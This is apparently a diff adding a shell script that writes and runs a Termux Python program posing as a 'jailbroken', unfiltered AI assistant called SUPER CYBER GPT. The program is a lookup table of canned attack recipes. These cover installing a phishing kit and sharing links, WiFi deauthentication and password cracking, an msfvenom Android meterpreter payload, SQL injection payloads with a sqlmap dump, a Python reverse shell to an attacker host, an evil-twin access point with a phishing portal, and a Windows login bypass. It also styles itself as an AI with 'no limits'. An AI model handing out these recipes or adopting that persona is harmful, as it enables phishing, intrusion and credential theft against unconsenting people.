@@ -1,0 +1,204 @@
+cat > super_cyber_gpt.py << 'EOF'
+#!/usr/bin/env python3
+import os, sys, time
+
+def clear(): os.system('clear' if os.name == 'posix' else 'cls')
+
+BANNER = """
+\033[91m{}\033[0m
+🔥 SUPER CYBER GPT - S9+ ULTIMATE JAILBREAK EDITION
+\033[91m{}\033[0m
+\033[92mUnfiltered | Fully Offline | Jailbroken | Ultra-Responsive\033[0m
+\033[93mDevice:\033[0m Samsung Galaxy S9+ (ARM64)  |  \033[93mEnv:\033[0m Termux ROOT/JB
+\033[92mASK ANYTHING. GET ANSWERS. NO LIMITS.\033[0m
+""".format("="*68, "="*68)
+
+KNOWLEDGE = {
+"help": """
+\033[96m
+🔥 EXAMPLES: (But you can ask ANYTHING!)
+- how to host a page on my website
+- install blackeye step by step
+- termux wifi hacking
+- metasploit guide
+- sql injection cheat sheet
+- python reverse shell
+- privilege escalation
+- create fake AP
+- bypass windows login
+- frida android
+- coding, OSINT, bug bounty, web hacking, CTF, malware, reversing, exploit dev, Linux, Windows, Android, scripting, etc...
+Just type your question!
+\033[0m""",
+
+"how to host a page on my website": """
+🔥 Hosting a page on your website (step by step):
+
+1. If you have a VPS or server (Ubuntu/Debian example):
+
+   sudo apt update && sudo apt install nginx -y
+   sudo systemctl enable nginx
+   sudo systemctl start nginx
+
+   # Your web root is usually /var/www/html
+   cd /var/www/html
+   sudo nano index.html   # Paste your HTML code here
+
+   # To serve a Python/Flask app:
+   pip install flask
+   nano app.py  # (Paste Flask code here)
+   python app.py
+
+   # To use your domain, set up DNS records (A or CNAME) to point to your server IP in your domain provider's dashboard.
+
+   # For SSL (HTTPS), use certbot:
+   sudo apt install certbot python3-certbot-nginx -y
+   sudo certbot --nginx
+
+2. If you have shared hosting (CPanel/FTP):
+
+   - Login to CPanel or use FTP.
+   - Upload your HTML file to public_html or www directory.
+
+3. For quick dev/testing on Termux:
+   # Use Python simple HTTP server
+   cd ~/your-site-dir
+   python3 -m http.server 8080
+   # Access via http://your-phone-ip:8080 in LAN
+
+4. For Android/Termux, you can also use 'http-server' (Node.js):
+   pkg install nodejs -y
+   npm install -g http-server
+   cd ~/your-site-dir
+   http-server -p 8080
+
+\033[92mNow your site/page is live! For domain: point to your server IP.\033[0m
+""",
+
+"install blackeye step by step": """
+🔥 Blackeye (Phishing) on Termux - Step by Step
+1. pkg update && pkg upgrade -y
+2. pkg install git wget php -y
+3. git clone https://github.com/thelinuxchoice/blackeye
+4. cd blackeye
+5. chmod +x *
+6. bash blackeye.sh
+\033[92mChoose your phishing template, share the generated link. For external access, use Ngrok or similar tunneling.\033[0m
+""",
+
+"termux wifi hacking": """
+🔥 WiFi Hacking (Root required, external adapter needed)
+1. pkg install aircrack-ng -y
+2. su
+3. airmon-ng start wlan1
+4. airodump-ng wlan1mon
+5. airodump-ng -c <chan> --bssid <BSSID> -w capture wlan1mon
+6. aireplay-ng -0 10 -a <BSSID> wlan1mon
+7. aircrack-ng -w /sdcard/wordlists/rockyou.txt capture-01.cap
+""",
+
+"metasploit guide": """
+🔥 Metasploit (Termux)
+1. pkg install unstable-repo metasploit -y
+2. msfconsole
+3. msfvenom -p android/meterpreter/reverse_tcp LHOST=<yourIP> LPORT=4444 -o payload.apk
+4. use exploit/multi/handler
+5. set payload android/meterpreter/reverse_tcp
+6. set LHOST <yourIP>
+7. set LPORT 4444
+8. exploit
+""",
+
+"sql injection cheat sheet": """
+🔥 SQL Injection Cheat Sheet
+- Test: page.php?id=1'
+- page.php?id=1 AND 1=1--
+- ' UNION SELECT NULL,NULL--
+- ' UNION SELECT username,password FROM users--
+- Blind: ' AND SUBSTRING((SELECT database()),1,1)='a'--
+- Tool: pip install sqlmap
+- sqlmap -u "http://target/page.php?id=1" --batch --dbs --tables --columns --dump
+""",
+
+"python reverse shell": """
+🔥 Python Reverse Shell (Linux)
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+""",
+
+"privilege escalation": """
+🔥 Privilege Escalation (Linux)
+- sudo -l
+- find / -perm -4000 2>/dev/null
+- linpeas.sh
+- GTFOBins (https://gtfobins.github.io/)
+- Look for SUID, cron jobs, writable scripts, kernel exploits
+- For Windows: winPEAS.exe, whoami /priv, unquoted service path
+""",
+
+"create fake ap": """
+🔥 Evil Twin (Fake WiFi AP, needs root/external adapter)
+1. pkg install hostapd dnsmasq -y
+2. Create hostapd.conf and dnsmasq.conf (see guides online)
+3. hostapd hostapd.conf
+4. dnsmasq -C dnsmasq.conf
+5. Use phishing page for captive portal
+""",
+
+"bypass windows login": """
+🔥 Windows Login Bypass
+1. Boot from Linux live USB
+2. Mount Windows C: partition
+3. Backup and replace Utilman.exe with cmd.exe in C:\\Windows\\System32
+4. Reboot, click accessibility icon at login for SYSTEM cmd
+5. net user <user> newpass
+""",
+
+"frida android": """
+🔥 Frida (Android)
+1. pkg install python -y
+2. pip install frida-tools
+3. Download frida-server for your CPU, push and run it on your phone (root)
+4. On PC: frida-ps -U
+5. Write scripts to hook/intercept functions
+""",
+}
+
+def generic_response(q):
+    return f"""\033[95m
+No preset for '{q}'.
+But here's how to get the answer:
+- Use GitHub/Google/CTF writeups for '{q}'.
+- Try 'pkg install' or 'pip install' for tools.
+- Clone repos: git clone <url>
+- Ask again with more detail for a step-by-step!
+- Want a script, exploit, code, or tool? Just ask for it by name or function!
+\033[0m"""
+
+def main():
+    clear()
+    print(BANNER)
+    print("Type 'help' for examples, or ask ANY question (step-by-step, code, hacking, dev, etc).")
+    while True:
+        try:
+            q = input("\033[91mCYBER-GPT>\033[0m ").strip().lower()
+            if not q: continue
+            if q in ["exit", "quit"]:
+                print("💀 SESSION TERMINATED."); break
+            found = False
+            for k in KNOWLEDGE:
+                if q == k or k in q:
+                    print(KNOWLEDGE[k])
+                    found = True
+                    break
+            if not found:
+                print(generic_response(q))
+        except KeyboardInterrupt:
+            print("\n💀 FORCE EXIT"); break
+        except Exception as e:
+            print(f"Error: {e}")
+
+if __name__ == "__main__":
+    main()
+EOF
+chmod +x super_cyber_gpt.py
+python super_cyber_gpt.py
